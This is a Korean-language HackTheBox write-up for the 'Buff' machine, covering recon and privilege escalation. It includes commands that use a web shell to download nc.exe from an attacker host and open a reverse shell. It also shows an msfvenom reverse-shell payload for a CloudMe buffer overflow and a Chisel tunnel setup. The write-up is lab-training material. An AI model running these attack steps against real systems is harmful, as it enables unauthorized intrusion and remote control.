# Buff - HackTheBox
## Recon
```bash
sudo nmap -p 7680,8080 -sC -sV -vv -oA buff 10.10.10.198
```
<img width="1104" height="194" alt="image" src="https://github.com/user-attachments/assets/4b3af666-6a27-42d6-a26d-5f0347052850" />

- HTTP(8080)

---
## HTTP(8080)
- `Contact`탭에서 `Gym Management Software 1.0` 발견.
<img width="504" height="203" alt="image" src="https://github.com/user-attachments/assets/c11e2512-717e-433f-8fde-52130e9e9616" />

### RCE
- `searchsploit`으로 `RCE`페이로드 발견.
```bash
searchsploit gym management
```
<img width="1104" height="248" alt="image" src="https://github.com/user-attachments/assets/2fee49f8-179f-4941-ad6c-cba684935002" />

<br>
<br>

- `/upload.php`에 접근이 가능할 때 웹 셸 코드의 파일 확장자를 `.php.png`로 만들어 업로드하는 취약점.
```bash
searchsploit -m 48506
```
<img width="1104" height="584" alt="image" src="https://github.com/user-attachments/assets/e88ea38e-13cd-4359-adb5-a7febf3e5ee9" />

<br>
<br>

- proxies를 설정하여 `burpsuite`로 전달되는 내용 확인.
<img width="1104" height="42" alt="image" src="https://github.com/user-attachments/assets/81e0fcc1-d39a-4045-be78-210b3ea489ca" />

<br>
<br>

- `id`파라미터에 웹 셸의 이름을 작성해주고, 파일 확장자를 `.php.png`를 지정하여 웹 셸 코드 전달.
<img width="1100" height="244" alt="image" src="https://github.com/user-attachments/assets/dfacf35d-c6bd-4ff2-9a3f-a0f096e8abcf" />

<br>
<br>

- 명령어 실행 성공.
```bash
curl -s 'http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami'
```
<img width="1104" height="120" alt="image" src="https://github.com/user-attachments/assets/a30fad56-f38b-4f4b-81fc-0fdb9170b5bb" />

<br>
<br>

- 로컬로부터 `nc.exe`를 다운로드 받아 리버스 셸 실행.
```bash
curl -s 'http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl%20http%3A%2F%2F10.10.16.4%2Fnc.exe%20-o%20c%3A%5Ctemp%5Cnc.exe'

curl -s 'http://10.10.10.198:8080/upload/kamehameha.php?telepathy=c%3A%5Ctemp%5Cnc.exe%2010.10.16.4%2080%20-e%20cmd.exe'
```
<img width="1104" height="203" alt="image" src="https://github.com/user-attachments/assets/cd539fbd-e25a-44ef-a546-6babb5527bd4" />

<br>
<br>

- 셸 획득.
<img width="1104" height="213" alt="image" src="https://github.com/user-attachments/assets/150f19c8-8e3f-426b-af18-497f78c90249" />

---
## Privesc
- `powershell` 실행.
<img width="1105" height="101" alt="image" src="https://github.com/user-attachments/assets/8abee3b8-bd07-441b-a79b-f6cccb18b5bb" />

### Buffer Overflow
- `c:\users\shaun\downloads`에서 `CloudMe_1112.exe` 발견.
<img width="1104" height="262" alt="image" src="https://github.com/user-attachments/assets/1d02e49c-1c56-4014-ae18-444564e6e4d5" />

<br>
<br>

- `Cloudme`가 실행되고 있는 것을 확인.
```cmd
tasklist /v |findstr -i cloudme
```
<img width="1105" height="101" alt="image" src="https://github.com/user-attachments/assets/79282f62-4f9a-4b0e-b188-6a5cc10316ce" />

<br>
<br>

- `Buffer Overflow`취약점이 존재.
```bash
searchsploit cloudme
```
<img width="1104" height="363" alt="image" src="https://github.com/user-attachments/assets/c2d479e2-6c5e-4de4-b9ea-a263f05ce98c" />

<br>
<br>

- 파이썬 스크립트를 원격에서 실행시켜야 하는데, 파이썬이 설치가 되어 있지 않으면 어떻게 해야할지 고민.
- `Chisel`로 터널링을 생성하여 포워딩 된 포트에 페이로드를 전달 가능.
- 페이로드 변경이 필요.
<img width="1102" height="359" alt="image" src="https://github.com/user-attachments/assets/282e84ef-bf64-472b-87ed-866774f72df7" />

<br>
<br>

- 리버스 셸 페이로드 생성.
```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=80 -b '\x00\x0A\x0D' -f python
```
<img width="1102" height="384" alt="image" src="https://github.com/user-attachments/assets/9c1948c0-d407-4369-880a-3d96858135fb" />

<br>
<br>

- 리버스 셸 페이로드를 붙여넣은 뒤 `payload`변수를 `buf`로 변경.(포트 변경시 제대로 작동하지 않는 경우 발생.)
<img width="1105" height="597" alt="image" src="https://github.com/user-attachments/assets/3749043c-789b-4178-9c8f-a00dbdc31501" />

<br>
<br>

- `chisel.exe`를 로컬로부터 다운로드 받아서 실행.
```cmd
.\chisel.exe client 10.10.16.4:9000 R:8888:127.0.0.1:8888
```
<img width="1105" height="99" alt="image" src="https://github.com/user-attachments/assets/61d0a324-e25c-432e-b236-33f847d6131d" />

<br>
<br>

```bash
./chisel server -p 9000 --reverse
```
<img width="1102" height="126" alt="image" src="https://github.com/user-attachments/assets/1217c583-d4b4-4a07-bb3a-220e3bf771e4" />

<br>
<br>

- 스크립트 실행.
```bash
python3 48389.py
```
<img width="1105" height="53" alt="image" src="https://github.com/user-attachments/assets/c577d02f-ad19-4a42-a968-cb7668fc8eee" />

<br>
<br>

- 셸 획득.
<img width="1105" height="208" alt="image" src="https://github.com/user-attachments/assets/dff6435f-5ea1-435b-ad70-b772c2896cee" />

---
## FLAG
- `c:\users\shaun\desktop\user.txt`
<img width="1105" height="244" alt="image" src="https://github.com/user-attachments/assets/5cada4ae-36cb-4320-a4b7-4f41a7cb3658" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1105" height="261" alt="image" src="https://github.com/user-attachments/assets/638f95e9-1886-4aac-b4cc-fa1b3513eccd" />



















